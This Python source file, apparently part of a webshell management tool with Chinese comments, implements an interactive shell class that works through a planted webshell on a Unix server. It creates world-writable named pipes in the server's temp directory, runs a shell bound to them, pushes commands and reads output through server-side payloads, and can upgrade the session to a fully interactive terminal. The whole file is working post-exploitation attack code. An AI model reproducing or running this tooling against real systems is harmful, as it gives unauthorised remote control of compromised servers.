import threading
import json
import base64
import importlib
import os
import re
from api.exploit import WebshellExploit
from api import utils, logger, config, ioconfig
from .base import BaseShell

class NamedpipeUnixShell(BaseShell):
    r'''使用管道通信生成一个交互式shell，用于类Unix系统
    '''
    def __init__(self, exploit:WebshellExploit, shell: str):
        super().__init__(exploit)
        self.shell = shell

        self.out_pipe = self.exp.session.server_info.tmpdir+self.exp.session.server_info.sep+utils.randomstr(10)+"_out" # 输出管道，结果会写入该管道
        self.in_pipe = self.exp.session.server_info.tmpdir+self.exp.session.server_info.sep+utils.randomstr(10)+"_in" # 输入管道，命令会从该管道读取

        self._lock = threading.Lock()
        self.last_recv = None

    def close(self):
        self._lock.acquire()
        if self.running:
            self.exp.session.client.options.set_temp_option("timeout", 5)
            self.exp.evalfile('interact_namedpipe/unix/close', outpipe=self.out_pipe, inpipe=self.in_pipe, pwd=self.exp.session.pwd)
            self.running = False
            logger.info("Shell has exist!")
        self._lock.release()

    def _shell(self):# 服务端执行shell
        self.exp.session.client.options.set_temp_option('timeout', 0)
        self.exp.exec_command(f"{self.shell} >{self.out_pipe} 2>&1 <{self.in_pipe}") # 阻塞
        self.close()

    def _keep_shell_alive(self):# 连接到管道保持shell一直存活
        self.exp.exec_command(f"mkfifo {self.in_pipe} {self.out_pipe} && chmod 777 {self.in_pipe} {self.out_pipe}") # 先尝试使用命令创建管道
        self.exp.session.client.options.set_temp_option('timeout', 0)
        ret = self.exp.evalfile('interact_namedpipe/unix/keep', outpipe=self.out_pipe, inpipe=self.in_pipe, pwd=self.exp.session.pwd)
        ret = ret.data
        if ret is None:
            logger.error("`Keep_shell_alive` error!")
        elif ret == "-1":
            logger.info("`posix_mkfifo` create pipe failed!")
        self.close()

    def _reader(self):# 从管道读取结果
        while(self.running):
            self.exp.session.client.options.set_temp_option('timeout', 0)
            ret = self.exp.evalfile('interact_namedpipe/unix/reader', outpipe=self.out_pipe, pwd=self.exp.session.pwd)
            ret = ret.data
            if ret is None:
                logger.error("Reader error!")
                continue
            ret = json.loads(ret)
            if ret['code'] == 1:
                data = base64.b64decode(ret['msg'].encode()).decode(self.exp.session.client.options.encoding, 'ignore')
                self._lock.acquire()
                self.last_recv = data
                self._lock.release()
                print(data, end="", flush=True)
            elif ret['code'] == -2:
                continue
            elif ret['code'] == -1:
                self.close()
                break
        logger.info("reader exit")

    def _writer(self, cmd:str):# 写入一个命令
        self._lock.acquire()
        self.last_recv = None # 写入命令前将上次接收内容置空
        self._lock.release()
        ret = self.exp.evalfile('interact_namedpipe/unix/writer', cmd=cmd, inpipe=self.in_pipe, pwd=self.exp.session.pwd)
        ret = ret.data
        if ret is None:
            logger.error(f"Cmd `{cmd}` write failed!")
        elif ret == "-1":
            self.close()

    def cmdloop(self):
        self.running = True
        thread_list = []
        keepthread = threading.Thread(target=self._keep_shell_alive, name="keep shell alive")
        shellthread = threading.Thread(target=self._shell, name="shell")
        readerthread = threading.Thread(target=self._reader, name="reader")
        keepthread.setDaemon(True)
        shellthread.setDaemon(True)
        readerthread.setDaemon(True)

        thread_list.append(keepthread)
        keepthread.start()
        utils.sleep(1)
        if self.running:
            thread_list.append(shellthread)
            thread_list.append(readerthread)
            shellthread.start()
        else:
            return

        utils.sleep(1)
        readerthread.start()
        try:
            if self.exp.session.server_info.isUnix() and config.platform.startswith('linux'):
                logger.info('You can type `:getfshell` to upgrade to a fully interactive shell(The premise is that Pty has been obtained.)')
                logger.info("Type `Ctrl + c` three times in a row to exit the fully interactive shell")
            while self.running:
                cmd = utils.input()
                if not cmd:
                    continue
                if self.exp.session.server_info.isUnix() and cmd == ':getfshell' and config.platform.startswith('linux'):
                    if not self.enter_fully_shell():
                        logger.error("Unable to get a fully interactive shell!")
                        continue
                    break
                self._writer(cmd+'\n')
        except KeyboardInterrupt:
            pass

        self.close()
        logger.info("Wait for thread exit...")
        for t in thread_list:
            t.join(5)
            if t.is_alive() and not utils.kill_thread(t.ident):
                logger.error(f"Exit thread `{t.name}` failed, thread id is `{t.ident}`!")
        logger.info("All have been cleaned up!")

    def enter_fully_shell(self)-> bool:
        '''获取完全交互式shell，仅支持Unix（服务器和本机）,需要首先获取一个tty
        '''
        self._writer('tty && echo -e "ok\\tok" || echo -e "not\\ta\\ttty"\n')
        msg = ''
        sign = False
        while True:
            self._lock.acquire()
            msg = self.last_recv
            self._lock.release()
            if msg is not None:
                if "not\ta\ttty" in msg:
                    logger.error("There is no Pty at present!")
                    break
                elif "ok\tok" in msg:
                    sign = True
                    break
            if not self.running:
                return False
            utils.sleep(0.1)
        if sign:
            rows = os.get_terminal_size().lines
            columns = os.get_terminal_size().columns
            term = os.environ.get('TERM', 'linux')
            self._writer(f'export TERM={term};export SHELL=bash;stty rows {rows} columns {columns}\n')
            # 设置当前terminal
            termios = importlib.import_module('termios')
            tty = importlib.import_module('tty')
            fd = ioconfig.stdin.fileno()
            old = termios.tcgetattr(fd)
            new = old[:]
            new[3] &= ~termios.ECHO
            termios.tcsetattr(fd, termios.TCSANOW, new)
            tty.setraw(fd, termios.TCSANOW)
            logger.info("Now you have acquired a fully interactive shell!", True)

            # 进入完全交互式shell
            exit_code = b''
            while self.running:
                cmd = ioconfig.stdin.getbytes(length=10)
                if cmd == b"\x03":
                    exit_code += b'\x03'
                else:
                    exit_code = b''
                if exit_code == b'\x03\x03\x03':
                    break
                self._writer(cmd)

            # 还原终端设置
            termios.tcsetattr(fd, termios.TCSANOW, old)
            return True
        return False
